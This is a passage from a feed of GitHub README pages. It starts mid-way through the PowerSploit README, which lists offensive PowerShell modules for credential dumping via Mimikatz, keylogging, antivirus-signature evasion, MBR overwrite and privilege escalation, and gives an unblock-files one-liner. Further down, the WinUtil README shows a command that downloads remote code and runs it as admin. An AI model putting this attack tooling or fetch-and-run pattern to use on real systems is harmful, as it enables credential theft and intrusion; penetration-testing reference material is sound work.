&lt;p&gt;Configure elevated persistence options for the Add-Persistence function.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Add-Persistence&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Add persistence capabilities to a script.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Install-SSP&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Installs a security support provider (SSP) dll.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-SecurityPackages&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Enumerates all loaded security packages (SSPs).&lt;/p&gt; 
&lt;h2&gt;AntivirusBypass&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;AV doesn&#39;t stand a chance against PowerShell!&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Find-AVSignature&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Locates single Byte AV signatures utilizing the same method as DSplit from &quot;class101&quot;.&lt;/p&gt; 
&lt;h2&gt;Exfiltration&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;All your data belong to me!&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-TokenManipulation&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-CredentialInjection&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-NinjaCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-Mimikatz&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-Keystrokes&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Logs keys pressed, time and the active window.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-GPPPassword&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-GPPAutologon&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-TimedScreenshot&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;A function that takes screenshots at a regular interval and saves them to a folder.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;New-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Creates a new volume shadow copy.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Lists the device paths of all local volume shadow copies.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Mount-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Mounts a volume shadow copy.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Remove-VolumeShadowCopy&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Deletes a volume shadow copy.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-VaultCredential&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Displays Windows vault credential objects including cleartext web credentials.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Out-Minidump&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Generates a full-memory minidump of a process.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-MicrophoneAudio&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Records audio from system microphone and saves to disk&lt;/p&gt; 
&lt;h2&gt;Mayhem&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Cause general mayhem with PowerShell.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Set-MasterBootRecord&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Proof of concept code that overwrites the master boot record with the message of your choice.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Set-CriticalProcess&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Causes your machine to blue screen upon exiting PowerShell.&lt;/p&gt; 
&lt;h2&gt;Privesc&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Tools to help with escalating privileges on a target.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;PowerUp&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Clearing house of common privilege escalation checks, along with some weaponization vectors.&lt;/p&gt; 
&lt;h2&gt;Recon&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Tools to aid in the reconnaissance phase of a penetration test.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-Portscan&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Does a simple port scan using regular sockets, based (pretty) loosely on nmap.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Get-HttpStatus&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;Invoke-ReverseDnsLookup&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;Scans an IP address range for DNS PTR records.&lt;/p&gt; 
&lt;h4&gt;&lt;code&gt;PowerView&lt;/code&gt;&lt;/h4&gt; 
&lt;p&gt;PowerView is series of functions that performs network and Windows domain enumeration and exploitation.&lt;/p&gt; 
&lt;h2&gt;Recon\Dictionaries&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;A collection of dictionaries used to aid in the reconnaissance phase of a penetration test. Dictionaries were taken from the following sources.&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;admin.txt - &lt;a href=&quot;http://cirt.net/nikto2/&quot;&gt;http://cirt.net/nikto2/&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;generic.txt - &lt;a href=&quot;http://sourceforge.net/projects/yokoso/files/yokoso-0.1/&quot;&gt;http://sourceforge.net/projects/yokoso/files/yokoso-0.1/&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;sharepoint.txt - &lt;a href=&quot;http://www.stachliu.com/resources/tools/sharepoint-hacking-diggity-project/&quot;&gt;http://www.stachliu.com/resources/tools/sharepoint-hacking-diggity-project/&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;The PowerSploit project and all individual scripts are under the &lt;a href=&quot;https://raw.github.com/mattifestation/PowerSploit/master/LICENSE&quot;&gt;BSD 3-Clause license&lt;/a&gt; unless explicitly noted otherwise.&lt;/p&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;p&gt;Refer to the comment-based help in each individual script for detailed usage information.&lt;/p&gt; 
&lt;p&gt;To install this module, drop the entire PowerSploit folder into one of your module directories. The default PowerShell module paths are listed in the $Env:PSModulePath environment variable.&lt;/p&gt; 
&lt;p&gt;The default per-user module path is: &quot;$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules&quot; The default computer-level module path is: &quot;$Env:windir\System32\WindowsPowerShell\v1.0\Modules&quot;&lt;/p&gt; 
&lt;p&gt;To use the module, type &lt;code&gt;Import-Module PowerSploit&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;To see the commands imported, type &lt;code&gt;Get-Command -Module PowerSploit&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;If you&#39;re running PowerShell v3 and you want to remove the annoying &#39;Do you really want to run scripts downloaded from the Internet&#39; warning, once you&#39;ve placed PowerSploit into your module path, run the following one-liner: &lt;code&gt;$Env:PSModulePath.Split(&#39;;&#39;) | % { if ( Test-Path (Join-Path $_ PowerSploit) ) {Get-ChildItem $_ -Recurse | Unblock-File} }&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;For help on each individual command, Get-Help is your friend.&lt;/p&gt; 
&lt;p&gt;Note: The tools contained within this module were all designed such that they can be run individually. Including them in a module simply lends itself to increased portability.&lt;/p&gt; 
&lt;h2&gt;Contribution Rules&lt;/h2&gt; 
&lt;p&gt;We need contributions! If you have a great idea for PowerSploit, we&#39;d love to add it. New additions will require the following:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The script must adhere to the style guide. Any exceptions to the guide line would need an explicit, valid reason.&lt;/li&gt; 
 &lt;li&gt;The module manifest needs to be updated to reflect the new function being added.&lt;/li&gt; 
 &lt;li&gt;A brief description of the function should be added to this README.md&lt;/li&gt; 
 &lt;li&gt;Pester tests must accompany all new functions. See the Tests folder for examples but we are looking for tests that at least cover the basics by testing for expected/unexpected input/output and that the function exhibits desired functionality. Make sure the function is passing all tests (preferably in mutiple OSes) prior to submitting a pull request. Thanks!&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Script Style Guide&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;For all contributors and future contributors to PowerSploit, I ask that you follow this style guide when writing your scripts/modules.&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Avoid Write-Host &lt;strong&gt;at all costs&lt;/strong&gt;. PowerShell functions/cmdlets are not command-line utilities! Pull requests containing code that uses Write-Host will not be considered. You should output custom objects instead. For more information on creating custom objects, read these articles:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href=&quot;http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/19/create-custom-objects-in-your-powershell-script.aspx&quot;&gt;http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/19/create-custom-objects-in-your-powershell-script.aspx&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;http://technet.microsoft.com/en-us/library/ff730946.aspx&quot;&gt;http://technet.microsoft.com/en-us/library/ff730946.aspx&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If you want to display relevant debugging information to the screen, use Write-Verbose. The user can always just tack on &#39;-Verbose&#39;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Always provide descriptive, comment-based help for every script. Also, be sure to include your name and a BSD 3-Clause license (unless there are extenuating circumstances that prevent the application of the BSD license).&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Make sure all functions follow the proper PowerShell verb-noun agreement. Use Get-Verb to list the default verbs used by PowerShell. Exceptions to supported verbs will be considered on a case-by-case basis.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;I prefer that variable names be capitalized and be as descriptive as possible.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Provide logical spacing in between your code. Indent your code to make it more readable.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If you find yourself repeating code, write a function.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Catch all anticipated errors and provide meaningful output. If you have an error that should stop execution of the script, use &#39;Throw&#39;. If you have an error that doesn&#39;t need to stop execution, use Write-Error.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If you are writing a script that interfaces with the Win32 API, try to avoid compiling C# inline with Add-Type. Try to use the PSReflect module, if possible.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Do not use hardcoded paths. A script should be useable right out of the box. No one should have to modify the code unless they want to.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;PowerShell v2 compatibility is highly desired.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Use positional parameters and make parameters mandatory when it makes sense to do so. For example, I&#39;m looking for something like the following:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;[Parameter(Position = 0, Mandatory = $True)]&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Don&#39;t use any aliases unless it makes sense for receiving pipeline input. They make code more difficult to read for people who are unfamiliar with a particular alias.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Try not to let commands run on for too long. For example, a pipeline is a natural place for a line break.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Don&#39;t go overboard with inline comments. Only use them when certain aspects of the code might be confusing to a reader.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Rather than using Out-Null to suppress unwanted/irrelevant output, save the unwanted output to $null. Doing so provides a slight performance enhancement.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Use default values for your parameters when it makes sense. Ideally, you want a script that will work without requiring any parameters.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;If a script creates complex custom objects, include a ps1xml file that will properly format the object&#39;s output.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>microsoftgraph/microsoft-graph-docs-contrib</title>
      <link>https://github.com/microsoftgraph/microsoft-graph-docs-contrib</link>
      <description>&lt;p&gt;Documentation for the Microsoft Graph REST API&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Microsoft Graph documentation&lt;/h1&gt; 
&lt;p&gt;Thank you for your interest in Microsoft Graph documentation! For the best experience, we recommend you view this content on &lt;a href=&quot;https://learn.microsoft.com/graph&quot;&gt;Microsoft Learn&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Give us your feedback&lt;/h2&gt; 
&lt;p&gt;Your feedback is important to us.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;To let us know about any questions or issues you find in the documentation, &lt;a href=&quot;https://learn.microsoft.com/contribute/content/provide-feedback#use-the-standard-experience&quot;&gt;leave feedback using the standard experience&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;We also encourage you to fork, make the fix, and do a pull request of your proposed changes. See &lt;a href=&quot;https://raw.githubusercontent.com/microsoftgraph/microsoft-graph-docs-contrib/main/CONTRIBUTING.md&quot;&gt;CONTRIBUTING.md&lt;/a&gt; for contributing guidelines.&lt;/li&gt; 
 &lt;li&gt;To let us know about your programming experience, what you would like to see in future versions, code samples, and so on, enter your suggestions and ideas at &lt;a href=&quot;https://techcommunity.microsoft.com/t5/microsoft-365-developer-platform/idb-p/Microsoft365DeveloperPlatform/label-name/Microsoft%20Graph&quot;&gt;Microsoft 365 Developer Platform Tech Community&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Code of conduct&lt;/h2&gt; 
&lt;p&gt;This project has adopted the &lt;a href=&quot;https://opensource.microsoft.com/codeofconduct/&quot;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&quot;https://opensource.microsoft.com/codeofconduct/faq/&quot;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&quot;mailto:opencode@microsoft.com&quot;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>ChrisTitusTech/winutil</title>
      <link>https://github.com/ChrisTitusTech/winutil</link>
      <description>&lt;p&gt;Chris Titus Tech&#39;s Windows Utility - Install Programs, Tweaks, Fixes, and Updates&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Chris Titus Tech&#39;s Windows Utility&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/releases/latest&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/v/release/ChrisTitusTech/winutil?color=%230567ff&amp;amp;label=Latest%20Release&amp;amp;style=for-the-badge&quot; alt=&quot;Version&quot; /&gt;&lt;/a&gt; &lt;img src=&quot;https://img.shields.io/github/downloads/ChrisTitusTech/winutil/winutil.ps1?label=Total%20Downloads&amp;amp;style=for-the-badge&quot; alt=&quot;GitHub Downloads (specific asset, all releases)&quot; /&gt; &lt;a href=&quot;https://discord.gg/RUbZUZyByQ&quot;&gt;&lt;img src=&quot;https://dcbadge.limes.pink/api/server/https://discord.gg/RUbZUZyByQ?theme=default-inverted&amp;amp;style=for-the-badge&quot; alt=&quot;&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://winutil.christitus.com/&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Documentation-_?style=for-the-badge&amp;amp;logo=bookstack&amp;amp;color=grey&quot; alt=&quot;Static Badge&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;This utility is a compilation of Windows tasks I perform on each Windows system I use. It is meant to streamline &lt;em&gt;installs&lt;/em&gt;, debloat with &lt;em&gt;tweaks&lt;/em&gt;, troubleshoot with &lt;em&gt;config&lt;/em&gt;, and fix Windows &lt;em&gt;updates&lt;/em&gt;. I am extremely picky about any contributions to keep this project clean and efficient.&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Chris-Titus-Docs/winutil-docs/refs/heads/main/assets/images/Title-Screen.png&quot; alt=&quot;screen-install&quot; /&gt;&lt;/p&gt; 
&lt;h2&gt;💡 Usage&lt;/h2&gt; 
&lt;p&gt;Winutil must be run in Admin mode because it performs system-wide tweaks. To achieve this, run PowerShell as an administrator. Here are a few ways to do it:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Start menu Method:&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Right-click on the start menu.&lt;/li&gt; 
   &lt;li&gt;Choose &quot;Windows PowerShell (Admin)&quot; (for Windows 10) or &quot;Terminal (Admin)&quot; (for Windows 11).&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Search and Launch Method:&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Press the Windows key.&lt;/li&gt; 
   &lt;li&gt;Type &quot;PowerShell&quot; or &quot;Terminal&quot; (for Windows 11).&lt;/li&gt; 
   &lt;li&gt;Press &lt;code&gt;Ctrl + Shift + Enter&lt;/code&gt; or Right-click and choose &quot;Run as administrator&quot; to launch it with administrator privileges.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Launch Command&lt;/h3&gt; 
&lt;h4&gt;Stable Branch (Recommended)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;irm &quot;https://christitus.com/win&quot; | iex
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Dev Branch&lt;/h4&gt; 
&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;irm &quot;https://christitus.com/windev&quot; | iex
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If you have Issues, refer to &lt;a href=&quot;https://winutil.christitus.com/knownissues/&quot;&gt;Known Issues&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;🎓 Documentation&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] To contribute to the documentation, please visit &lt;a href=&quot;https://github.com/Chris-Titus-Docs/winutil-docs&quot;&gt;WinUtil Docs Repo&lt;/a&gt; for more info.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;&lt;a href=&quot;https://winutil.christitus.com/&quot;&gt;WinUtil Official Documentation&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=6UQZ5oQg8XA&quot;&gt;YouTube Tutorial&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;&lt;a href=&quot;https://christitus.com/windows-tool/&quot;&gt;ChrisTitus.com Article&lt;/a&gt;&lt;/h3&gt; 
&lt;h2&gt;🛠️ Build &amp;amp; Develop&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] Winutil is a relatively large script, so it&#39;s split into multiple files which&#39;re combined into a single &lt;code&gt;.ps1&lt;/code&gt; file using a custom compiler. This makes maintaining the project a lot easier.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Get a copy of the source code, this can be done using GitHub UI (&lt;code&gt;Code -&amp;gt; Download ZIP&lt;/code&gt;), or by cloning (downloading) the repo using git.&lt;/p&gt; 
&lt;p&gt;If git is installed, run the following commands under a PowerShell window to clone and move into project&#39;s directory:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;git clone --depth 1 &quot;https://github.com/ChrisTitusTech/winutil.git&quot;
cd winutil
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To build the project, run the Compile Script under a PowerShell window (admin permissions IS NOT required):&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;.\Compile.ps1
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You&#39;ll see a new file named &lt;code&gt;winutil.ps1&lt;/code&gt;, which&#39;s created by &lt;code&gt;Compile.ps1&lt;/code&gt; script, now you can run it as admin and a new window will popup, enjoy your own compiled version of WinUtil :)&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!TIP] For more info on using WinUtil and how to develop for it, please consider reading &lt;a href=&quot;https://winutil.christitus.com/contributing/&quot;&gt;the Contribution Guidelines&lt;/a&gt;, if you don&#39;t know where to start, or have questions, you can ask over on our &lt;a href=&quot;https://discord.gg/RUbZUZyByQ&quot;&gt;Discord Community Server&lt;/a&gt; and active project members will answer when they can.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;💖 Support&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;To morally and mentally support the project, make sure to leave a ⭐️!&lt;/li&gt; 
 &lt;li&gt;EXE Wrapper for $10 @ &lt;a href=&quot;https://www.cttstore.com/windows-toolbox&quot;&gt;https://www.cttstore.com/windows-toolbox&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;💖 Sponsors&lt;/h2&gt; 
&lt;p&gt;These are the sponsors that help keep this project alive with monthly contributions.&lt;/p&gt; 
&lt;!-- sponsors --&gt;
&lt;a href=&quot;https://github.com/TriHydera&quot;&gt;&lt;img src=&quot;https://github.com/TriHydera.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: TriHydera&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/DelDongo&quot;&gt;&lt;img src=&quot;https://github.com/DelDongo.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/markamos&quot;&gt;&lt;img src=&quot;https://github.com/markamos.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Mark Amos&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/dwelfusius&quot;&gt;&lt;img src=&quot;https://github.com/dwelfusius.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/mews-se&quot;&gt;&lt;img src=&quot;https://github.com/mews-se.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Martin Stockzell&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/jdiegmueller&quot;&gt;&lt;img src=&quot;https://github.com/jdiegmueller.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Jason A. Diegmueller&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/robertsandrock&quot;&gt;&lt;img src=&quot;https://github.com/robertsandrock.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: RMS&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/KenichiQaz&quot;&gt;&lt;img src=&quot;https://github.com/KenichiQaz.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Stefan&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/paulsheets&quot;&gt;&lt;img src=&quot;https://github.com/paulsheets.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Paul&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/djones369&quot;&gt;&lt;img src=&quot;https://github.com/djones369.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Dave J. - WhamGeek&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/anthonymendez&quot;&gt;&lt;img src=&quot;https://github.com/anthonymendez.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Anthony Mendez&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/FatBastard0&quot;&gt;&lt;img src=&quot;https://github.com/FatBastard0.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/DursleyGuy&quot;&gt;&lt;img src=&quot;https://github.com/DursleyGuy.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: DursleyGuy&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/realmuddy&quot;&gt;&lt;img src=&quot;https://github.com/realmuddy.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Phillip Waters&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/quaszi&quot;&gt;&lt;img src=&quot;https://github.com/quaszi.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/DwayneTheRockLobster1&quot;&gt;&lt;img src=&quot;https://github.com/DwayneTheRockLobster1.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/KieraKujisawa&quot;&gt;&lt;img src=&quot;https://github.com/KieraKujisawa.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Kiera Meredith&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/singhchandan27&quot;&gt;&lt;img src=&quot;https://github.com/singhchandan27.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/danhively&quot;&gt;&lt;img src=&quot;https://github.com/danhively.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Dan Hively&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;https://github.com/Yamil-Serrano&quot;&gt;&lt;img src=&quot;https://github.com/Yamil-Serrano.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Neowizen&quot; /&gt;&lt;/a&gt;
&lt;!-- sponsors --&gt; 
&lt;h2&gt;🏅 Thanks to all Contributors&lt;/h2&gt; 
&lt;p&gt;Thanks a lot for spending your time helping Winutil grow. Thanks a lot! Keep rocking 🍻.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/graphs/contributors&quot;&gt;&lt;img src=&quot;https://contrib.rocks/image?repo=ChrisTitusTech/winutil&quot; alt=&quot;Contributors&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;📊 GitHub Stats&lt;/h2&gt; 
&lt;p&gt;&lt;img src=&quot;https://repobeats.axiom.co/api/embed/aad37eec9114c507f109d34ff8d38a59adc9503f.svg?sanitize=true&quot; alt=&quot;Alt&quot; title=&quot;Repobeats analytics image&quot; /&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>actions/runner-images</title>
      <link>https://github.com/actions/runner-images</link>
      <description>&lt;p&gt;GitHub Actions runner images&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;GitHub Actions Runner Images&lt;/h1&gt; 
&lt;p&gt;&lt;strong&gt;Table of Contents&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#about&quot;&gt;About&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#available-images&quot;&gt;Available Images&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#image-definitions&quot;&gt;Image Definitions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#image-releases&quot;&gt;Image Releases&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#software-and-image-support&quot;&gt;Software and Image Support&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#how-to-interact-with-the-repo&quot;&gt;How to Interact with the Repo&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#faqs&quot;&gt;FAQs&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;About&lt;/h2&gt; 
